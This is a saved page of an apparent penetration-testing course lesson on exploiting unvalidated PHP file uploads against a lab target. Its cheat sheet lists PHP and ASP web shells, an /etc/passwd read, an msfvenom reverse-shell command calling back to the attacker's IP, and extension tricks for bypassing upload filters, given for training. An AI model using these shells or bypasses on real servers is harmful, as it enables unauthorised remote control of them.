<!DOCTYPE html>

<!-- saved from url=(0054)https://academy.hackthebox.com/module/136/section/1260 -->
<html lang="en"><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>File Upload Attacks</title>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Premium Multipurpose Admin &amp; Dashboard Template" name="description"/>
<meta content="Themesbrand" name="author"/>
<link href="https://academy.hackthebox.com/images/favicon.ico" rel="shortcut icon"/>
<link href="https://academy.hackthebox.com/images/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
<link href="https://academy.hackthebox.com/images/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
<link href="https://academy.hackthebox.com/images/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="https://academy.hackthebox.com/images/safari-pinned-tab.svg" rel="mask-icon"/>
<link data-style="dark" href="./File Upload Attacks2_files/bootstrap-dark.css" id="bootstrap-style" rel="stylesheet" type="text/css"/>
<link href="./File Upload Attacks2_files/icons.css" rel="stylesheet" type="text/css"/>
<link data-style="dark" href="./File Upload Attacks2_files/app-dark.css" id="app-style" rel="stylesheet" type="text/css"/>
<link data-style="dark" href="./File Upload Attacks2_files/prism.css" id="app-style" rel="stylesheet" type="text/css"/>
<link href="./File Upload Attacks2_files/toastr.min.css" rel="stylesheet" type="text/css"/>
<link href="./File Upload Attacks2_files/ryt3opf.css" rel="stylesheet"/>
<script async="" src="./File Upload Attacks2_files/awwxrc0h" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/uwt.js.download" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/346791856678772"></script><script async="" src="./File Upload Attacks2_files/fbevents.js.download" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/insight.min.js.download" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/analytics.js.download" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/commons.54701049fd6fb8497e9e.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/intercom.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/twitter-ads.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/linkedin-insight-tag.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/facebook-pixel.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/google-analytics.dynamic.js.gz" status="loaded" type="text/javascript"></script><script async="" crossorigin="anonymous" integrity="sha384-TE9Ls1LqNaomGaFdDlxBJIkg+bFnKWbASEx9XrnnCV1SiORfW/qiKK2lsAbkVeBa" src="./File Upload Attacks2_files/recaptcha__en.js.download" type="text/javascript"></script><script async="" src="./File Upload Attacks2_files/analytics.min.js.download" type="text/javascript"></script><script>
        !function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics._writeKey="eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I";analytics.SNIPPET_VERSION="4.13.2";
                analytics.load("eLzeD0QoARKZ42pc8AGEUYpcFLpYkf0I");
                                                        properties = {"platform":"Academy","platform_version":"V1","module_id":136,"module_name":"File Upload Attacks","module_difficulty":"Medium","section_id":1260,"section_title":"Absent Validation"};
                                                analytics.page(
                    "Module",
                    properties
                );
                                            }
        }();
    </script>
<style>
    .website-screenshot-url {
        height: 22px;
        cursor: text;
        padding-left: 10px;
    }
</style>
<script src="./File Upload Attacks2_files/api.js.download"></script>
</head>
<body data-layout="detached" data-topbar="colored">
<div class="container-fluid">
<div id="layout-wrapper">
<header id="page-topbar">
<div class="navbar-header">
<div class="container-fluid">
<div class="float-right">
<div class="dropdown d-none d-lg-inline-block ml-1">
<a href="https://academy.hackthebox.com/billing">
<button class="btn btn-extra-light" type="button">
<i class="fad fa-cube text-success mt-1 mr-2"></i> Purchase Cubes
</button>
</a>
</div>
<div class="dropdown d-none d-lg-inline-block ml-1">
<button class="btn header-item noti-icon waves-effect" data-toggle="fullscreen" type="button">
<i class="mdi mdi-fullscreen"></i>
</button>
</div>
<div class="dropdown d-inline-block">
<button aria-expanded="false" aria-haspopup="true" class="btn header-item waves-effect" data-toggle="dropdown" id="page-header-user-dropdown" type="button">
<img alt="Header Avatar" class="rounded-circle header-profile-user" src="./File Upload Attacks2_files/1782606024b767354a8c9d75e1a6323a"/>
<span class="d-none d-xl-inline-block ml-1">Tommy034</span>
<i class="mdi mdi-chevron-down d-none d-xl-inline-block"></i>
</button>
<div class="dropdown-menu dropdown-menu-right">
<a class="dropdown-item" href="https://academy.hackthebox.com/billing"><i class="bx bx-wallet font-size-16 align-middle mr-1"></i> Billing</a>
<a class="dropdown-item d-block" href="https://academy.hackthebox.com/settings"><i class="bx bx-wrench font-size-16 align-middle mr-1"></i> Settings</a>
<a class="dropdown-item d-block" href="https://academy.hackthebox.com/vpn"><i class="bx bx-server font-size-16 align-middle mr-1"></i> Vpn Settings</a>
<div class="dropdown-divider"></div>
<form action="https://academy.hackthebox.com/logout" method="POST"> <input name="_token" type="hidden" value="OEgK0JdzOZwGIHHODUXYrzCqZr0uFSlpTj7r9g5E"/> <a class="dropdown-item text-danger" href="https://academy.hackthebox.com/module/136/section/1260#" onclick="$(this).closest('form').submit()"><i class="bx bx-power-off font-size-16 align-middle mr-1 text-danger"></i> Logout</a>
</form>
</div>
</div>
</div>
<div class="d-flex align-items-center">
<div class="navbar-brand-box">
<a class="logo" href="https://academy.hackthebox.com/dashboard">
<span class="logo-sm">
<img alt="" height="30" src="./File Upload Attacks2_files/logo.svg"/>
</span>
<span class="logo-lg">
<img alt="" height="36" src="./File Upload Attacks2_files/logo.svg"/>
</span>
</a>
</div>
<button class="btn btn-sm px-3 font-size-16 header-item toggle-btn waves-effect" id="vertical-menu-btn" type="button">
<i class="fa fa-fw fa-bars"></i>
</button>
<div class="topnav">
<nav class="navbar navbar-light navbar-expand-lg topnav-menu">
<div class="collapse navbar-collapse" id="topnav-menu-content">
<ul class="navbar-nav active">
<li class="nav-item">
<a class="nav-link" href="https://academy.hackthebox.com/dashboard"><i class="mdi mdi-monitor-dashboard"></i> Dashboard</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://academy.hackthebox.com/modules"><i class="mdi mdi-book-open"></i>
Modules</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://academy.hackthebox.com/paths"><i class="mdi mdi-map-marker-path"></i> Paths</a>
</li>
</ul>
</div>
</nav>
</div>
</div>
</div>
</div>
</header>
<div class="main-content">
<div class="page-content">
<div class="row">
<div class="col-12">
<div class="page-title-box d-flex align-items-center justify-content-between">
<h4 class="page-title mb-0 font-size-18 letter-spacing-1">File Upload Attacks  <i class="favouriteBtn fa fa-heart text-danger" data-module-id="136" data-original-title="" data-title="Toggle To-Do" data-toggle="tooltip" style="cursor:pointer;" title=""></i></h4>
<div class="page-title-right">
<ol class="breadcrumb m-0">
<li class="breadcrumb-item"><a href="javascript: void(0);">Page 2</a></li>
<li class="breadcrumb-item active">Absent Validation</li>
</ol>
</div>
</div>
</div>
</div>
<div class="row justify-content-xl-center">
<div class="col-md-12 col-xl-9 col-xxl-7">
<div class="training-module">
<h1>Absent Validation</h1>
<hr/>
<p>The most basic type of file upload vulnerability occurs when the web application <code>does not have any form of validation filters</code> on the uploaded files, allowing the upload of any file type by default.</p>
<p>With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.</p>
<hr/>
<h2>Arbitrary File Upload</h2>
<p>Let's start the exercise at the end of this section, and we will see an <code>Employee File Manager</code> web application, which allows us to upload personal files to the web application:
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="mr-2">
<i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
</span>
<input class="website-screenshot-url" disabled="" type="text" value="http://SERVER_IP:PORT/"/>
<span class="float-right"><i class="fa fa-bars"></i></span>
</div>
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="./File Upload Attacks2_files/file_uploads_file_manager.jpg" style="border: 0px; border-radius: 0px;"/></div></div></p>
<p>The web application does not mention anything about what file types are allowed, and we can drag and drop any file we want, and its name will appear on the upload form, including <code>.php</code> files:
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="mr-2">
<i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
</span>
<input class="website-screenshot-url" disabled="" type="text" value="http://SERVER_IP:PORT/"/>
<span class="float-right"><i class="fa fa-bars"></i></span>
</div>
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="./File Upload Attacks2_files/file_uploads_file_selected_php_file.jpg" style="border: 0px; border-radius: 0px;"/></div></div></p>
<p>Furthermore, if we click on the form to select a file, the file selector dialog does not specify any file type, as it says <code>All Files</code> for the file type, which may also suggest that no type of restrictions or limitations are specified for the web application:
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="mr-2">
<i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
</span>
<input class="website-screenshot-url" disabled="" type="text" value="http://SERVER_IP:PORT/"/>
<span class="float-right"><i class="fa fa-bars"></i></span>
</div>
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="./File Upload Attacks2_files/file_uploads_file_selection_dialog.jpg" style="border: 0px; border-radius: 0px;"/></div></div></p>
<p>All of this tells us that the program appears to have no file type restrictions on the front-end, and if no restrictions were specified on the back-end, we might be able to upload arbitrary file types to the back-end server to gain complete control over it.</p>
<hr/>
<h2>Identifying Web Framework</h2>
<p>We need to upload a malicious script to test whether we can upload any file type to the back-end server and test whether we can use this to exploit the back-end server. Many kinds of scripts can help us exploit web applications through arbitrary file upload, most commonly a <code>Web Shell</code> script and a <code>Reverse Shell</code> script.</p>
<p>A Web Shell provides us with an easy method to interact with the back-end server by accepting shell commands and printing their output back to us within the web browser. A web shell has to be written in the same programming language that runs the web server, as it runs platform-specific functions and commands to execute system commands on the back-end server, making web shells non-cross-platform scripts. So, the first step would be to identify what language runs the web application.</p>
<p>This is usually relatively simple, as we can often see the web page extension in the URLs, which may reveal the programming language that runs the web application. However, in certain web frameworks and web languages, <code>Web Routes</code> are used to map URLs to web pages, in which case the web page extension may not be shown. Furthermore, file upload exploitation would also be different, as our uploaded files may not be directly routable or accessible.</p>
<p>One easy method to determine what language runs the web application is to visit the <code>/index.ext</code> page, where we would swap out <code>ext</code> with various common web extensions, like <code>php</code>, <code>asp</code>, <code>aspx</code>, among others, to see whether any of them exist.</p>
<p>For example, when we visit our exercise below, we see its URL as <code>http://SERVER_IP:PORT/</code>, as the <code>index</code> page is usually hidden by default. But, if we try visiting <code>http://SERVER_IP:PORT/index.php</code>, we would get the same page, which means that this is indeed a <code>PHP</code> web application. We do not need to do this manually, of course, as we can use a tool like Burp Intruder for fuzzing the file extension using a <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt" rel="noopener nofollow" target="_blank">Web Extensions</a> wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.</p>
<p>Several other techniques may help identify the technologies running the web application, like using the <a href="https://www.wappalyzer.com/" rel="noopener nofollow" target="_blank">Wappalyzer</a> extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application:
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="mr-2">
<i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
</span>
<input class="website-screenshot-url" disabled="" type="text" value="http://SERVER_IP:PORT/"/>
<span class="float-right"><i class="fa fa-bars"></i></span>
</div>
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="./File Upload Attacks2_files/file_uploads_wappalyzer.jpg" style="border: 0px; border-radius: 0px;"/></div></div></p>
<p>As we can see, not only did the extension tell us that the web application runs on <code>PHP</code>, but it also identified the type and version of the web server, the back-end operating system, and other technologies in use. These extensions are essential in a web penetration tester's arsenal, though it is always better to know alternative manual methods to identify the web framework, like the earlier method we discussed.</p>
<p>We may also run web scanners to identify the web framework, like Burp/ZAP scanners or other Web Vulnerability Assessment tools. In the end, once we identify the language running the web application, we may upload a malicious script written in the same language to exploit the web application and gain remote control over the back-end server.</p>
<hr/>
<h2>Vulnerability Identification</h2>
<p>Now that we have identified the web framework running the web application and its programming language, we can test whether we can upload a file with the same extension. As an initial test to identify whether we can upload arbitrary <code>PHP</code> files, let's create a basic <code>Hello World</code> script to test whether we can execute <code>PHP</code> code with our uploaded file.</p>
<p>To do so, we will write <code>&lt;?php echo "Hello HTB";?&gt;</code> to <code>test.php</code>, and try uploading it to the web application:
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="mr-2">
<i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
</span>
<input class="website-screenshot-url" disabled="" type="text" value="http://SERVER_IP:PORT/"/>
<span class="float-right"><i class="fa fa-bars"></i></span>
</div>
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/" src="./File Upload Attacks2_files/file_uploads_upload_php.jpg" style="border: 0px; border-radius: 0px;"/></div></div></p>
<p>The file appears to have successfully been uploaded, as we get a message saying <code>File successfully uploaded</code>, which means that <code>the web application has no file validation whatsoever on the back-end</code>. Now, we can click the <code>Download</code> button, and the web application will take us to our uploaded file:
<div class="window_container"><div class="window_content">
<div class="window_top">
<span class="mr-2">
<i class="fa fa-arrow-circle-left"></i> <i class="fa fa-arrow-right"></i> <i class="fa fa-redo"></i> <i class="fa fa-home"></i>
</span>
<input class="website-screenshot-url" disabled="" type="text" value="http://SERVER_IP:PORT/uploads/test.php"/>
<span class="float-right"><i class="fa fa-bars"></i></span>
</div>
<img class="website-screenshot" data-url="http://SERVER_IP:PORT/uploads/test.php" src="./File Upload Attacks2_files/file_uploads_hello_htb.jpg" style="border: 0px; border-radius: 0px;"/></div></div></p>
<p>As we can see, the page prints our <code>Hello HTB</code> message, which means that the <code>echo</code> function was executed to print our string, and we successfully executed <code>PHP</code> code on the back-end server. If the page could not run PHP code, we would see our source code printed on the page.</p>
<p>In the next section, we will see how to exploit this vulnerability to execute code on the back-end server and take control over it.</p>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i></h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-primary btn-lg btn-block" style="margin-top: 270px;">Start Instance</button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
</p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen</button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate</button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset</button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left: <span class="lifeLeft"></span>m</button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-original-title="" data-title="Extend Life" data-toggle="tooltip" style="display:none;" title=""><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to start...</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below to complete this Section and earn cubes!</p>
<p class="card-title-desc font-size-large font-size-15">
Target: <span class="text-success"><span class="target" style="cursor:pointer;"><span class="spawnTargetBtn">Click here to spawn the target system!</span></span></span>
<button class="resetTargetBtn btn btn-light btn-sm" data-original-title="" data-title="Reset Target" data-toggle="tooltip" style="cursor: pointer; display: none;" title=""><i class="fad fa-sync text-warning"></i></button>
<br/>
<span class="targetLifeTimeContainer" style="display: none;">Time Left: <span class="targetLifeTime font-size-15">0</span> minutes</span>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2" data-target="#cheatSheetModal" data-toggle="modal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="858"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.</label>
<div class="row">
<div class="col-lg-8 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer858" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="858" id="btnAnswer858"><i class="fad fa-flag-checkered mr-2"></i> Submit</button>
</div>
<div class="col-lg-2 mb-4">
<button class="btn btn-outline-warning btn-block" data-target="#hint858" data-toggle="modal" id="hintBtn858"><i class="fad fa-life-ring mr-2"></i> Hint</button>
</div>
</div>
<div class=""></div>
</div>
</div>
</div>
</div>
</div>
<div class="card bg-color-blue-nav" style="margin: 30px 0">
<div class="card-body">
<a class="btn btn-light module-button py-2" href="https://academy.hackthebox.com/module/136/section/1259" style="float: left"><i class="fa fa-arrow-alt-left mr-1"></i> Previous</a>
<form action="https://academy.hackthebox.com/module" class="form-inline" id="completeForm" method="POST" style="float: right">
<input name="module_id" type="hidden" value="136"/>
<input name="page_id" type="hidden" value="3"/>
<input name="completed" type="hidden" value="1"/>
<button class="btn btn-outline-success" id="completeBtn" style="display:none;"><i class="fa fa-check-circle"></i> Mark Complete &amp; Next</button>
</form>
<a class="btn btn-light ml-2 module-button py-2" href="File Upload Attacks3.html" style="float: left">Next <i class="ml-1 fa fa-arrow-alt-right"></i></a>
</div>
</div>
</div>
<div class="col-md-12 col-xl-3 col-xxl-3">
<div id="table-of-contents">
<div class="card">
<div class="card-body bg-color-blue-nav">
<button class="btn btn-light btn-block module-button" data-target="#cheatSheetModal" data-toggle="modal"><i class="fad fa-file-alt mr-2"></i> Cheat Sheet</button>
<a class="btn btn-light btn-block module-button" href="https://academy.hackthebox.com/module/136/section/1260#questionsDiv"><i class="fad fa-question mr-2"></i> Go to Questions</a>
</div>
</div>
<div class="card" id="TOC">
<div class="card-body bg-color-blue-nav">
<h5 class="card-title font-size-15 mb-4">Table of Contents</h5>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1259">
<span class="font-size-13">Intro to File Upload Attacks</span>
</a>
<h6 class="mt-4 mb-2">Basic Exploitation</h6> <a class="btn text-primary btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1260">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Absent Validation</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1261">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Upload Exploitation</span>
</a>
<h6 class="mt-4 mb-2">Bypassing Filters</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1280">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Client-Side Validation</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1288">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Blacklist Filters</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1289">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Whitelist Filters</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1290">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Type Filters</span>
</a>
<h6 class="mt-4 mb-2">Other Upload Attacks</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1291">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Limited File Uploads</span>
</a>
<a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1292">
<span class="font-size-13">Other Upload Attacks</span>
</a>
<h6 class="mt-4 mb-2">Prevention</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1309">
<span class="font-size-13">Preventing File Upload Vulnerabilities</span>
</a>
<h6 class="mt-4 mb-2">Skills Assessment</h6> <a class="btn btn-sm btn-block mt-1 py-2 text-left btn-lighter" href="https://academy.hackthebox.com/module/136/section/1310">
<i class="fad fa-cube text-success mt-1 mr-2"></i> 
<span class="font-size-13">Skills Assessment - File Upload Attacks</span>
</a>
</div>
</div>
<div class="card">
<div class="card-body bg-color-blue-nav">
<h5 class="card-title mb-4">My Workstation</h5>
<div class="row">
<div class="col-12">
<div id="sidePreview" style="height: 160px; border: 1px solid #323232; border-radius: 5px; background-color: #0a121c; text-align: center">
<div class="screenPlaceholder">
<p class="instanceStart" style="padding-top:70px; letter-spacing: 5px;">OFFLINE</p>
<p class="instanceLoading" style="padding-top:70px; display: none"><i class="fa fa-circle-notch fa-spin"></i> Starting...</p>
</div>
</div>
</div>
<div class="col-12 mt-2">
<div class="instanceStart">
<button class="startInstanceBtn btn btn-light btn-sm mt-2 btn-block module-button py-2"><i class="fad fa-play-circle text-success"></i>  Start Instance</button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
</p>
</div>
<button class="fullScreenBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none;"><i class="fad fa-expand text-success"></i>  Interact</button>
<button class="terminateInstanceBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate</button>
<button class="resetInstanceBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none;"><i class="fad fa-sync text-warning"></i>  Reset</button>
<div class="btn-group" role="group">
<button class="extendInstanceBtn btn btn-light btn-sm mt-2 module-button py-2" style="display:none; cursor: default;">Life Left: <span class="lifeLeft"></span>m</button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm mt-2 module-button py-2" data-original-title="" data-title="Extend Life" data-toggle="tooltip" style="display:none;" title=""><i class="fa fa-plus text-success"></i></button>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div aria-hidden="true" aria-labelledby="hint858" class="modal fade" id="hint858" role="dialog" tabindex="-1">
<div class="modal-dialog modal-dialog-centered">
<div class="modal-content">
<div class="modal-body">
<div class="text-center">
<h5><i class="fad fa-life-ring text-success"></i>  Hint</h5>
<br/>
<h6>You may use the 'system()' PHP function to execute system commands</h6>
</div>
</div>
</div>
</div>
</div>
<div aria-hidden="true" aria-labelledby="unlockModuleModal" class="modal fade" id="cheatSheetModal" role="dialog" tabindex="-1">
<div class="modal-dialog modal-lg">
<div class="modal-content">
<div class="modal-body">
<div class="text-center text-break">
<h5><i class="fad fa-file-alt"></i>  Cheat Sheet</h5>
<p>The cheat sheet is as a useful command reference for this module.</p>
<h2>Web Shells</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Web Shell</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;?php file_get_contents('/etc/passwd'); ?&gt;</code></td>
<td>Basic PHP File Read</td>
</tr>
<tr>
<td><code>&lt;?php system('hostname'); ?&gt;</code></td>
<td>Basic PHP Command Execution</td>
</tr>
<tr>
<td><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></td>
<td>Basic PHP Web Shell</td>
</tr>
<tr>
<td><code>&lt;% eval request('cmd') %&gt;</code></td>
<td>Basic ASP Web Shell</td>
</tr>
<tr>
<td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code></td>
<td>Generate PHP reverse shell</td>
</tr>
<tr>
<td><a href="https://github.com/Arrexel/phpbash">PHP Web Shell</a></td>
<td>PHP Web Shell</td>
</tr>
<tr>
<td><a href="https://github.com/pentestmonkey/php-reverse-shell">PHP Reverse Shell</a></td>
<td>PHP Reverse Shell</td>
</tr>
<tr>
<td><a href="https://github.com/danielmiessler/SecLists/tree/master/Web-Shells">Web/Reverse Shells</a></td>
<td>List of Web Shells and Reverse Shells</td>
</tr>
</tbody>
</table></div>
<h2>Bypasses</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Command</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Client-Side Bypass</strong></td>
<td></td>
</tr>
<tr>
<td><code>[CTRL+SHIFT+C]</code></td>
<td>Toggle Page Insepctor</td>
</tr>
<tr>
<td><strong>Blacklist Bypass</strong></td>
<td></td>
</tr>
<tr>
<td><code>shell.phtml</code></td>
<td>Uncommon Extension</td>
</tr>
<tr>
<td><code>shell.pHp</code></td>
<td>Case Manipulation</td>
</tr>
<tr>
<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst">PHP Extensions</a></td>
<td>List of PHP Extensions</td>
</tr>
<tr>
<td><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP">ASP Extensions</a></td>
<td>List of ASP Extensions</td>
</tr>
<tr>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt">Web Extensions</a></td>
<td>List of Web Extensions</td>
</tr>
<tr>
<td><strong>Whitelist Bypass</strong></td>
<td></td>
</tr>
<tr>
<td><code>shell.jpg.php</code></td>
<td>Double Extension</td>
</tr>
<tr>
<td><code>shell.php.jpg</code></td>
<td>Reverse Double Extension</td>
</tr>
<tr>
<td><code>%20</code>, <code>%0a</code>, <code>%00</code>, <code>%0d0a</code>, <code>/</code>, <code>.\</code>, <code>.</code>, <code>…</code></td>
<td>Character Injection - Before/After Extension</td>
</tr>
<tr>
<td><strong>Content/Type Bypass</strong></td>
<td></td>
</tr>
<tr>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt">Web Content-Types</a></td>
<td>List of Web Content-Types</td>
</tr>
<tr>
<td><a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt">Content-Types</a></td>
<td>List of All Content-Types</td>
</tr>
<tr>
<td><a href="https://en.wikipedia.org/wiki/List_of_file_signatures">File Signatures</a></td>
<td>List of File Signatures/Magic Bytes</td>
</tr>
</tbody>
</table></div>
<h2>Limited Uploads</h2>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Potential Attack</strong></th>
<th><strong>File Types</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>XSS</code></td>
<td>HTML, JS, SVG, GIF</td>
</tr>
<tr>
<td><code>XXE</code>/<code>SSRF</code></td>
<td>XML, SVG, PDF, PPT, DOC</td>
</tr>
<tr>
<td><code>DoS</code></td>
<td>ZIP, JPG, PNG</td>
</tr>
</tbody>
</table></div>
</div>
</div>
<div class="modal-footer">
<a class="btn btn-light btn-block" href="https://academy.hackthebox.com/module/cheatsheet/136">Download Cheatsheet</a>
</div>
</div>
</div>
</div>
</div>
<footer class="footer">
<div class="container-fluid">
<div class="row">
<div class="col-sm-6">
</div>
<div class="col-sm-6">
<div class="text-sm-right d-none d-sm-block">
Powered by   <a href="https://www.hackthebox.com/" target="_blank"><img height="20px" src="./File Upload Attacks2_files/logo-htb.svg" style="margin-bottom: 1px;"/></a>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
